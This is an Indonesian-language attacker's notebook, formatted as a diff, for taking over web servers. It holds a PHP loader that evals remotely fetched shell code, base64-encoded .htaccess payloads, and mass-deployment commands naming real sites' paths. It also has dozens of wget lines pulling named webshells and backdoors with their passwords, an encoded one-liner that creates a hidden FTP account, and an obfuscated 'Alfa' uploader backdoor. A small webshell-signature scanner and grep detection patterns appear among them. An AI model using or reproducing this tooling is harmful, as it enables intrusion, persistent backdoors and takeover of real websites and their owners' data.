+  curl_setopt($ch, CURLOPT_URL, $url); 
+
+ 
+
+  $data = curl_exec($ch); 
+
+  curl_close($ch); 
+
+ 
+
+  return $data; 
+
+} 
+
+   eval('?>' . get('shell.txt')); 
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+HTACCESS PERTAMA
+
+
+
+echo "PEZpbGVzICoucGgqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5QaCo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLnBIKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICouUEgqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5zaCo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLlNoKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICouc0gqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5TSCo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLkFTKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICouQXMqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5hUyo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLmFzKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICIqLnBocCI+CiAgICBBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgIioucGhwIj4KICAgIFJlcXVpcmUgYWxsIGdyYW50ZWQKPC9GaWxlcz4KPEZpbGVzTWF0Y2ggIlwuKGpwZ3xqcGVnfHBuZ3xnaWZ8Ym1wfGljbykkIj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KPEZpbGVzTWF0Y2ggIlwuKG1wNHxhdml8bW92fHdtdnxtcDN8d2F2fG9nZykkIj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KPEZpbGVzTWF0Y2ggIlwuKHBkZnxkb2N8ZG9jeHx4bHN8eGxzeHx6aXB8cmFyfHRhcnxnenxwcHR8cHB0eHxjc3Z8KSQiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgQWxsb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPgoKT3B0aW9ucyAtSW5kZXhlcw==" | base64 -d | tee .htaccess;chmod 0444 .htaccess
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+HTACCESS KEDUA
+
+
+
+echo 'PEZpbGVzICoucGgqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5QaCo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLnBIKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICouUEgqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5zaCo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLlNoKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICouc0gqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5TSCo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLkFTKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzICouQXMqPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzPgo8RmlsZXMgKi5hUyo+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBEZW55IGZyb20gYWxsCjwvRmlsZXM+CjxGaWxlcyAqLmFzKj4KICAgIE9yZGVyIERlbnksQWxsb3cKICAgIERlbnkgZnJvbSBhbGwKPC9GaWxlcz4KPEZpbGVzTWF0Y2ggIlwuKGpwZ3xqcGVnfHBuZ3xnaWZ8c3ZnfGJtcHxpY298d2VicHxoZWljKSQiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgQWxsb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPgo8RmlsZXNNYXRjaCAiXC4obXA0fHdlYm18YXZpfG1vdnx3bXZ8bXAzfHdhdnxvZ3Z8b2dnKSQiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgQWxsb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPgo8RmlsZXNNYXRjaCAiXC4ocGRmfGRvY3xkb2N4fHhsc3x4bHN4fHppcHxyYXJ8dGFyfGd6fHBwdHxwcHR4fGNzdnwpJCI+CiAgICBPcmRlciBEZW55LEFsbG93CiAgICBBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CgpPcHRpb25zIC1JbmRleGVz' | base64 -d | tee .htaccess;chmod 0444 .htaccess
+
+
+
+Kill all htaccess
+
+find . -name ".htaccess" -type f -not -perm 0444 -delete
+
+
+
+
+
+find . -name ".htaccess" -type f -exec chmod 644 {} +
+
+
+
+
+
+
+
+COMMAND MASS HTACCESS
+
+
+
+
+
+
+
+find /var/www/vhosts/u0352719.plsk.regruhosting.ru/httpdocs/samsspc.ru/ -type d -exec cp /var/www/vhosts/u0352719.plsk.regruhosting.ru/httpdocs/samsspc.ru/.well-known/.htaccess {} \;
+
+
+
+find /home/u541407971/domains/oasistable.in/public_html/ -type d -exec cp /home/u541407971/domains/oasisitstore.in/public_html/image/.htaccess {} \;
+
+
+
+find /home/u541407971/domains/rest.oasispos.in/public_html/ -type d -exec cp /home/u541407971/domains/oasisitstore.in/public_html/image/.htaccess {} \;
+
+
+
+
+
+
+
+CLOACKING INDO
+
+https://okepaste.cc/r/124e4b15
+
+
+
+
+
+
+
+COMMAND WGET SHELL
+
+
+
+WGET SHELL
+
+
+
+wget https://pastedav.id/d/2F4BensQ -O ptsmc-cn.php // Seobyjnx
+
+
+
+wget https://pastedav.id/d/RfWaxKsn -O wp-ptsmc.php 
+
+
+
+wget https://pastedav.id/d/rZ4T6mEx -O waras.php
+
+
+
+wget https://okepaste.cc/r/4271f482 -O ptsmcbase.php // Seobyjnx
+
+
+
+wget https://pastedav.id/d/SqM0om7X -O bypass-ptsmc.php
+
+
+
+wget https://pastedav.id/d/0nWHsc9T -O geckobypass.php 
+
+
+
+wget https://pastedav.id/d/UTIm3qL1 -O wso.php // admin
+
+
+
+wget https://pastedav.id/d/7LplnD4Q -O super.php
+
+
+
+wget https://pastedav.id/d/V2SbuHNG -O pek.php // Seobyjnx (Backdoor) - vBase
+
+
+
+wget https://okepaste.cc/r/783a60da -O cibai.php // ccc (Backdoor) - v1.2.0 ket (1x Upload 5 File Sekaligus)
+
+
+
+wget https://pastedav.id/d/YC9bEFt2 -O site.php // theme_customization_2023  (Backdoor) - v1.2.4
+
+
+
+wget https://okepaste.cc/r/2b5f452f -O simple.php // Seobyjnx (Backdoor) - v1.2.5
+
+
+
+wget https://okepaste.cc/r/ae6b6366 -O template.php // Seobyjnx (Backdoor) - v1.2.7
+
+
+
+wget https://pastedav.id/d/Fvq3Y2Ur -O option.php // Seobyjnx (Backdoor) - v1.2.9 - ?Fox=d3wL7
+
+
+
+wget https://pastedav.id/d/F2pgnvHu -O config.php // Seobyjnx (Backdoor) - v1.2.6 - ?Fox=d3wL7
+
+
+
+wget https://pastedav.id/d/KsJlpyEu -O locker.php (File Locker)
+
+
+
+wget https://pastedav.id/d/B8kQtHdg -O scan-webshell.php (scan webshell Ox505Aufa)
+
+
+
+wget https://pastedav.id/d/xJqHrbEN -O curian.php // ajg123
+
+
+
+wget https://pastedav.id/d/q52VGYQK -O blu.php // 
+
+
+
+wget https://raw.githubusercontent.com/soy777/2026news/main/archive.php -O console.php // admin|rahasia
+
+
+
+wget https://pastedav.id/d/a3ngeyip -O FM.php
+
+
+
+wget https://pastedav.id/d/nefhX7kU -O upload.php (Uploader) - upload.php?Fox=d3wL7
+
+
+
+wget https://pastedav.id/d/fMG4C1Na -O generator.php          WP UNLOCKER
+
+
+
+wget https://kasihsolusi.club/SHELL/Haxorsecv2 -O Haxorsecv2.php // Haxorsecv2
+
+
+
+wget https://pastedav.id/d/j8WzyC76 -O jnx.php // memekkuda
+
+
+
+wget https://pastedav.id/d/4ZcaIBDR -O Ngiler360.php
+
+
+
+wget https://okepaste.cc/r/1ff75d2b -O adminer.php //
+
+
+
+wget https://antigo.blog/SHELL/aktif.txt -O aktif.php //                 susah@banget1337
+
+
+
+wget https://antigo.blog/SHELL/alfa.txt -O alfa.php //                  susah@banget1337
+
+
+
+wget https://okepaste.cc/r/dfaa28d2 -O alfa2.php //                   susah@banget1337
+
+
+
+wget https://antigo.blog/SHELL/bypass.txt -O putih.php //                susah@banget1337
+
+
+
+wget https://kasihsolusi.club/SHELL/dan -O gecko.php //                 FortuneX88
+
+
+
+wget https://antigo.blog/SHELL/gel.txt -O gel.php //
+
+
+
+wget https://antigo.blog/SHELL/jnx.txt -O jnx.php //
+
+
+
+wget https://antigo.blog/SHELL/litespeedphp.txt -O litespeed.php //            ftwick
+
+
+
+wget https://antigo.blog/SHELL/shellsetan.txt -O shellsetan.php //            andi123
+
+
+
+wget https://hushh.pro/a1/webshell/shellscan/1.txt -O scan.php              admin - aziz          
+
+
+
+wget https://hushh.pro/a1/webshell/2.txt -O 2.php
+
+
+
+wget https://hushh.pro/a1/webshell/3.txt -O 3.php
+
+
+
+wget https://pastedav.id/d/xPlUarJR -O 3.php                  300700
+
+
+
+wget https://hushh.pro/a1/webshell/4031.txt -O 4031.php
+
+
+
+wget https://hushh.pro/a1/webshell/503.txt-O 503.php
+
+
+
+wget https://hushh.pro/a1/webshell/about.txt -O about.php
+
+
+
+wget https://hushh.pro/a1/webshell/alfa.txt -O alfa.php
+
+
+
+wget https://hushh.pro/a1/webshell/alfasc.txt -O apaya.php
+
+
+
+wget https://pastedav.id/d/aNfhnyRq -O alfabypass.php
+
+
+
+wget https://hushh.pro/a1/webshell/adminer.txt -O adminer.php
+
+
+
+wget https://www.sinigacorbang.one/tempatatas/shell/alfalitespeed.txt -O apals.php
+
+
+
+wget https://www.sinigacorbang.one/tempatatas/shell/alfalitespeed.txt -O england-img.php
+
+
+
+wget https://hushh.pro/a1/webshell/alfalitespeed.txt alfonso.php
+
+
+
+wget simpancom.top/server/shellbypassjos.txt -O music.php
+
+
+
+wget https://hushh.pro/a1/awesaa.txt -O awesaa.php                    S0L0K1LL3R
+
+
+
+wget https://hushh.pro/a1/webshell/anu.txt -O anu.php
+
+
+
+wget https://hushh.pro/a1/webshell/byps.txt -O byps.php
+
+
+
+wget https://hushh.pro/a1/webshell/bosku.txt -O bosku.php
+
+
+
+wget https://hushh.pro/a1/webshell/bypas1.txt -O bypas1.php
+
+
+
+wget https://hushh.pro/a1/webshell/bardoz-wp.txt -O bardoz.php               akses bardoz.php?load=meta - pass : alexganteng
+
+
+
+wget https://hushh.pro/a1/webshell/blues.txt -O blues.php                 akses bardoz.php?blues=clues
+
+
+
+wget https://hushh.pro/a1/webshell/.bingmek.txt -O bingmek.php
+
+
+
+wget https://hushh.pro/a1/webshell/configg.txt -O config.php
+
+
+
+wget https://hushh.pro/a1/webshell/data.txt -O data.php
+
+
+
+wget https://pastedav.id/d/E1ouGbsJ -O selda.php                 desah
+
+
+
+wget https://hushh.pro/a1/webshell/desah.txt -O desus.php
+
+
+
+wget https://pastedav.id/d/XpDcSNA1 -O filemanager1.php           
+
+
+
+wget https://hushh.pro/a1/webshell/filemanager2.txt -O filemanager2.php
+
+
+
+wget https://hushh.pro/a1/webshell/gelay.txt -O gelay.php
+
+
+
+wget https://hushh.pro/a1/webshell/gelaypw.txt -O gelaypw.php               user - l_Av9<'0v:9A
+
+
+
+wget https://hushh.pro/a1/webshell/kct.txt -O kct.php
+
+
+
+wget https://hushh.pro/a1/webshell/hide.txt -O hide.php                  300700
+
+
+
+wget https://hushh.pro/a1/webshell/kingfake.txt -O kingfake.php              KingFakee1337@Gacor
+
+
+
+wget https://hushh.pro/a1/webshell/kill.txt -O kill.php                  susah@banget1337
+
+
+
+wget https://hushh.pro/a1/kos.txt -O kos.php                        shell alfa bypas
+
+
+
+wget https://hushh.pro/a1/webshell/link.txt -O link.php                  alexganteng
+
+
+
+wget https://hushh.pro/a1/webshell/link2.txt -O link.php                  alexganteng
+
+
+
+wget https://hushh.pro/a1/webshell/link4.txt -O link.php                  alexganteng
+
+
+
+wget https://hushh.pro/a1/webshell/lite1.txt -O lite.php
+
+
+
+wget https://hushh.pro/a1/webshell/lite2.txt -O lite2.php
+
+
+
+wget https://hushh.pro/a1/webshell/leobe.txt -O leobe.php
+
+
+
+wget https://hushh.pro/a1/webshell/litespeed.txt -O litespeed.txt.php
+
+
+
+wget https://hushh.pro/a1/webshell/litespeedlex.txt -O ls.txt.php
+
+
+
+wget https://hushh.pro/a1/webshell/mami.txt -O mami.php
+
+
+
+wget https://hushh.pro/a1/webshell/mainhack.txt -O mainhack.php
+
+
+
+wget https://hushh.pro/a1/webshell/mini1.txt -O mini1.php                  shell gelay
+
+
+
+wget https://hushh.pro/a1/webshell/nano.txt -O nano.php
+
+
+
+wget https://pastedav.id/d/YMy3SKHZ -O ngiler.php
+
+
+
+wget https://hushh.pro/a1/webshell/peler.txt -O peler.php                  admin aziz
+
+
+
+wget https://hushh.pro/a1/webshell/pdbs.txt -O pdb.php
+
+
+
+wget https://hushh.pro/a1/webshell/raw.txt -O raw.php                    alexganteng
+
+
+
+wget https://hushh.pro/a1/webshell/ssh1.txt -O ssh1.php
+
+
+
+wget https://hushh.pro/a1/sekus.txt -O sekus.php
+
+
+
+wget https://hushh.pro/a1/webshell/sukses.txt -O sukses.php
+
+
+
+wget https://pastedav.id/d/c5aTmOoN -O selda.php
+
+
+
+wget https://hushh.pro/a1/webshell/sukses2.txt -O sukses2.php
+
+
+
+wget https://hushh.pro/a1/webshell/shellsetan.txt -O bodat.php                andi123  seohantu | alexganteng
+
+
+
+wget https://hushh.pro/a1/webshell/scanshell.txt -O scan.php
+
+
+
+wget https://hushh.pro/a1/webshell/scant.txt -O scant.php
+
+
+
+wget https://hushh.pro/a1/webshell/suksesatsp.txt -O suksesatsp.php
+
+
+
+wget https://hushh.pro/a1/webshell/wperror.txt -O wperror.php                ajg123
+
+
+
+wget https://hushh.pro/a1/webshell/wibu1.txt -O wibu1.php
+
+
+
+wget https://hushh.pro/a1/webshell/wibu2.txt -O wibu2.php                  zone7
+
+
+
+wget https://hushh.pro/a1/webshell/xmlrpc.txt -O xmlrpc.php
+
+
+
+1. Mencari File Berdasarkan Ekstensi .js
+
+Gunakan perintah find untuk mencari struktur path file JavaScript di dalam server atau direktori spesifik.
+
+
+
+Bash
+
+find /path/target -type f -name "*.js"
+
+
+
+PERINTAH FTP :
+
+
+
+Build Ftp account (costum) :
+
+uapi Ftp add_ftp user="admin" pass="lk7w1fvntg1#" quota="0" homedir="public_html"
+
+
+
+Build Ftp account 2 (costum) :
+
+
+
+USER_FTP="user" DIR_FTP="public_html" bash -c "$(echo 'dWFwaSBGdHAgYWRkX2Z0cCB1c2VyPSIkVVNFUl9GVFAiIHBhc3M9Ikxpam54aUFETUA3IiBxdW90YT0iMCIgaG9tZWRpcj0iJERJUl9GVFAiID4vZGV2L251bGwgMj4mMQpSRUFMX1VTRVI9JCh1YXBpIEZ0cCBsaXN0X2Z0cCB8IGdyZXAgLUUgInVzZXI6ICR7VVNFUl9GVFAlQCp9IiB8IHRhaWwgLW4gMSB8IGF3ayAne3ByaW50ICQyfScpCklQX1NFUlZFUj0kKGN1cmwgLXMgaWZjb25maWcubWUpCmVjaG8gLWUgIlxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCmVjaG8gIlsrXSBSRUtBUCBFS1NFS1VTSSBGVFAiCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgplY2hvICItLT4gSG9zdCAgICAgICAgOiAkSVBfU0VSVkVSIgplY2hvICItLT4gVXNlcm5hbWUgICAgOiAkUkVBTF9VU0VSIgplY2hvICItLT4gUGFzc3dvcmQgICAgOiBMaWpueGlBRE1ANyIKZWNobyAiLS0+IEhvbWRpciAgICAgIDogJERJUl9GVFAiCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ig==' | base64 -d)"
+
+
+
+cek akun siluman ftp :
+
+uapi Ftp list_ftp | grep -E "user:|dir:"
+
+
+
+delate beberapa user sekaligus :
+
+for ftp_user in "user1" "user2" "user3"; do echo "Memproses: $ftp_user"; uapi Ftp delete_ftp user="$ftp_user" destroy="1"; done
+
+
+
+delate akun ftp siluman :
+
+uapi Ftp delete_ftp user="admin" destroy="1"
+
+
+
+cek ip domain :
+
+curl ifconfig.me
+
+
+
+
+
+
+
+
+
+
+
+
+
+BABU PENDETEKSI FILE BARU DI BUAT
+
+
+
+
+
+
+
+<?php
+
+
+
+// Konfigurasis
+
+$targetDir = __DIR__;
+
+$logFile = '/home/namauser/logs/webshell_found.log';
+
+
+
+// Daftar signature webshell
+
+$webshellSignatures = [
+
+  'eval(',
+
+  'base64_decode(',
+
+  'system(',
+
+  'exec(',
+
+  'passthru(',
+
+  'shell_exec(',
+
+  'proc_open(',
+
+  'popen(',
+
+  'c99.sh',
+
+  'r57shell.php',
+
+  'wso.php',
+
+  'h4ck3r',
+
+  'hacked by'
+
+];
+
+
+
+/**
+
+ * Memindai direktori untuk mencari file PHP yang mencurigakan
+
+ */
+
+function scanForWebshells($dir, $signatures, &$suspiciousFiles) {
+
+  try {
+
+    $iterator = new RecursiveIteratorIterator(
+
+      new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
+
+      RecursiveIteratorIterator::SELF_FIRST
+
+    );
+
+
+
+    foreach ($iterator as $file) {
+
+      if ($file->isFile() && 
+
+        $file->isReadable() && 
+
+        strtolower($file->getExtension()) === 'php'
+
+      ) {
+
+        checkFileContent($file->getRealPath(), $signatures, $suspiciousFiles);
+
+      }
+
+    }
+
+  } catch (Exception $e) {
+
+    logMessage("Error saat memindai: " . $e->getMessage());
+
+  }
+
+}
+
+
+
+/**
+
+ * Memeriksa konten file untuk signature webshell
+
+ */
+
+function checkFileContent($filePath, $signatures, &$suspiciousFiles) {
+
+  $content = file_get_contents($filePath);
+
+  if ($content === false) {
+
+    logMessage("Tidak dapat membaca file: " . $filePath);
+
+    return;
+
+  }
+
+
+
+  foreach ($signatures as $signature) {
+
+    if (stripos($content, $signature) !== false) {
+
+      $suspiciousFiles[] = sprintf(
+
+        "File: %s - Signature: %s",
+
+        $filePath,
+
+        $signature
+
+      );
+
+      break;
+
+    }
+
+  }
+
+}
+
+
+
+/**
+
+ * Mencatat pesan ke log file
+
+ */
+
+function logMessage($message) {
+
+  global $logFile;
+
+  $timestamp = date('Y-m-d H:i:s');
+
+  $logEntry = "[$timestamp] $message\n";
+
+   
+
+  if (!file_exists(dirname($logFile))) {
+
+    mkdir(dirname($logFile), 0755, true);
+
+  }
+
+   
+
+  file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
+
+}
+
+
+
+// Eksekusi pemindaian
+
+$suspiciousFiles = [];
+
+scanForWebshells($targetDir, $webshellSignatures, $suspiciousFiles);
+
+
+
+// Handle hasil pemindaian
+
+if (!empty($suspiciousFiles)) {
+
+  $report = "Peringatan! File mencurigakan ditemukan:\n" . 
+
+       implode("\n", $suspiciousFiles) . "\n" .
+
+       str_repeat("-", 50) . "\n";
+
+   
+
+  logMessage($report);
+
+  echo "Peringatan! " . count($suspiciousFiles) . " file mencurigakan ditemukan.\n";
+
+  echo "Detail telah dicatat di: $logFile\n";
+
+} else {
+
+  logMessage("Pemindaian selesai - Tidak ada file mencurigakan yang ditemukan");
+
+  echo "Pemindaian selesai. Tidak ada file mencurigakan.\n";
+
+}
+
+
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Google Search Control
+
+
+
+wget https://hushh.pro/a1/google30cb56182f54b7f9.html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SITEMAP
+
+
+
+wget https://hushh.pro/a1/sitemap.xml
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+BACKDOOR ALFA
+
+
+
+<?php if(isset($_GET["HTML"])&&$_GET["HTML"]=="name"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+");exit;}?>
+
+
+
+file.php?HTML=payment
+
+
+
+
+
+
+
+
+
+
+
+Scan cepat pola berbahaya via SSH:
+
+
+
+grep -R --line-number -E "eval\(|base64_decode\(|gzinflate\(|assert\(|preg_replace\('/e'|php_uname\(|move_uploaded_file\(" /path/ke/public_html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Pola umum berbahaya:
+
+
+
+# Pola umum berbahaya:
+
+grep -RniE "eval\(|base64_decode\(|gzinflate\(|str_rot13\(|assert\(|preg_replace\(.*/e" --include="*.php" .
+
+# PHP yang baru diubah 7 hari terakhir:
+
+find . -type f -iname "*.php" -mtime -7 -printf '%TY-%Tm-%Td %TT %p\n' | sort -r
+
+# File gambar/ico tapi isinya PHP:
+
+find . -type f \( -iname "*.jpg" -o -iname "*.png" -o -iname "*.ico" \) -exec file {} \; | grep -i php
+
+# File world-writable:
+
+find . -type f -perm -o=w -ls\
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+LOGIN WORDPRESS:
+
+
+
+wget http://dapithengheng.site/sc/shell/adminwp.txt -O data.php
+
+https://penfox.ru/data.php?admin
+
+https://penfox.ru/data.php?administrator
+
+
+
+
+
+
+
+
+
+
+
+PANEL LOGIN TEMPLATE:
+
+
+
+<!DOCTYPE html>
+
+<html lang="id">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Panel Login</title>
+
+  <style>
+
+    * {
+
+      margin: 0;
+
+      padding: 0;
+
+      box-sizing: border-box;
+
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+
+    }
+
+     
+
+    body {
+
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+
+      height: 100vh;
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+    }
+
+     
+
+    .login-container {
+
+      background-color: rgba(255, 255, 255, 0.9);
+
+      border-radius: 10px;
+
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+
+      width: 100%;
+
+      max-width: 400px;
+
+      padding: 30px;
+
+    }
+
+     
+
+    .login-header {
+
+      text-align: center;
+
+      margin-bottom: 30px;
+
+    }
+
+     
+
+    .login-header h1 {
+
+      color: #333;
+
+      font-size: 24px;
+
+      margin-bottom: 10px;
+
+    }
+
+     
+
+    .login-header p {
+
+      color: #666;
+
+      font-size: 14px;
+
+    }
+
+     
+
+    .input-group {
+
+      margin-bottom: 20px;
+
+      position: relative;
+
+    }
+
+     
+
+    .input-group label {
+
+      display: block;
+
+      margin-bottom: 8px;
+
+      color: #555;
+
+      font-weight: 500;
+
+    }
+
+     
+
+    .input-group input {
+
+      width: 100%;
+
+      padding: 12px 15px;
+
+      border: 1px solid #ddd;
+
+      border-radius: 5px;
+
+      font-size: 16px;
+
+      transition: all 0.3s;
+
+    }
+
+     
+
+    .input-group input:focus {
+
+      border-color: #667eea;
+
+      outline: none;
+
+      box-shadow: 0 0 0 2px rgba(102, 126, 234, 0.2);
+
+    }
+
+     
+
+    .show-password {
+
+      position: absolute;
+
+      right: 12px;
+
+      top: 40px;
+
+      cursor: pointer;
+
+      color: #666;
+
+      font-size: 14px;
+
+    }
+
+     
+
+    .btn-login {
+
+      width: 100%;
+
+      padding: 12px;
+
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+
+      border: none;
+
+      border-radius: 5px;
+
+      color: white;
+
+      font-size: 16px;
+
+      font-weight: 600;
+
+      cursor: pointer;
+
+      transition: all 0.3s;
+
+    }
+
+     
+
+    .btn-login:hover {
+
+      transform: translateY(-2px);
+
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+
+    }
+
+     
+
+    .error-message {
+
+      color: #e74c3c;
+
+      text-align: center;
+
+      margin-top: 15px;
+
+      font-size: 14px;
+
+      display: none;
+
+    }
+
+     
+
+    .success-message {
+
+      color: #2ecc71;
+
+      text-align: center;
+
+      margin-top: 15px;
+
+      font-size: 14px;
+
+      display: none;
+
+    }
+
+     
+
+    @media (max-width: 480px) {
+
+      .login-container {
+
+        margin: 20px;
+
+        padding: 20px;
+
+      }
+
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <div class="login-container">
+
+    <div class="login-header">
+
+      <h1>Panel Login</h1>
+
+      <p>Masukkan username dan password untuk melanjutkan</p>
+
+    </div>
+
+     
+
+    <form id="loginForm">
+
+      <div class="input-group">
+
+        <label for="username">Username</label>
+
+        <input type="text" id="username" name="username" placeholder="Masukkan username" required>
+
+      </div>
+
+       
+
+      <div class="input-group">
+
+        <label for="password">Password</label>
+
